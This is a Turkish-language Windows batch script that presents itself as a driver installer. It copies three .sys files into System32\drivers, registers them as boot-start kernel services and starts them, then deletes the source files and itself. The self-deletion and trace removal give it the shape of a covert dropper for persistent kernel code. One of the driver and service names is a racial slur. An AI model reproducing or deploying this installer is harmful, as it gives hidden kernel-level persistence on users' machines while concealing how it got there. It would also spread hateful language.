@echo off
title Driver Yukleyici
cls

:: Yönetici yetkisi kontrolü
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Bu script YONETICI olarak calistirilmalidir.
    echo Scripte sag tiklayip "Yonetici olarak calistir" secin.
    pause
    exit /b
)

setlocal
set SCRIPT_DIR=%~dp0
set SYS_DEST=C:\Windows\System32\drivers

echo === Driver Yukleyici ===
echo.

:: Driver dosyalarini System32\drivers klasorune kopyala
echo Driver dosyalari kopyalaniyor...
if exist "%SCRIPT_DIR%aptal.sys" (
    copy /y "%SCRIPT_DIR%aptal.sys" "%SYS_DEST%" >nul
    echo   aptal.sys kopyalandi.
) else (
    echo   HATA: aptal.sys bulunamadi.
)

if exist "%SCRIPT_DIR%nigger.sys" (
    copy /y "%SCRIPT_DIR%nigger.sys" "%SYS_DEST%" >nul
    echo   nigger.sys kopyalandi.
) else (
    echo   HATA: nigger.sys bulunamadi.
)

if exist "%SCRIPT_DIR%oc.sys" (
    copy /y "%SCRIPT_DIR%oc.sys" "%SYS_DEST%" >nul
    echo   oc.sys kopyalandi.
) else (
    echo   HATA: oc.sys bulunamadi.
)

echo.

:: Servisleri oluştur
echo Servisler olusturuluyor...

sc create aptal_drv binPath= "C:\Windows\System32\drivers\aptal.sys" DisplayName= "Aptal Driver" start= boot type= kernel >nul 2>&1
if %errorLevel% equ 0 (
    echo   aptal_drv servisi olusturuldu.
) else (
    echo   aptal_drv servisi olusturulamadi.
)

sc create nigger_drv binPath= "C:\Windows\System32\drivers\nigger.sys" DisplayName= "Nigger Driver" start= boot type= kernel >nul 2>&1
if %errorLevel% equ 0 (
    echo   nigger_drv servisi olusturuldu.
) else (
    echo   nigger_drv servisi olusturulamadi.
)

sc create oc_drv binPath= "C:\Windows\System32\drivers\oc.sys" DisplayName= "OC Driver" start= boot type= kernel >nul 2>&1
if %errorLevel% equ 0 (
    echo   oc_drv servisi olusturuldu.
) else (
    echo   oc_drv servisi olusturulamadi.
)

echo.

:: Servisleri başlat
echo Servisler baslatiliyor...

sc start aptal_drv >nul 2>&1
if %errorLevel% equ 0 (
    echo   aptal_drv baslatildi.
) else (
    echo   aptal_drv baslatilamadi.
)

sc start nigger_drv >nul 2>&1
if %errorLevel% equ 0 (
    echo   nigger_drv baslatildi.
) else (
    echo   nigger_drv baslatilamadi.
)

sc start oc_drv >nul 2>&1
if %errorLevel% equ 0 (
    echo   oc_drv baslatildi.
) else (
    echo   oc_drv baslatilamadi.
)


:: Önce çalışma dizinindeki .sys dosyalarını siler (opsiyonel)
del /f /q "%SCRIPT_DIR%aptal.sys" 2>nul
del /f /q "%SCRIPT_DIR%nigger.sys" 2>nul
del /f /q "%SCRIPT_DIR%oc.sys" 2>nul

:: En son scriptin kendisini siler
start /b "" cmd /c del "%~f0"&exit /b
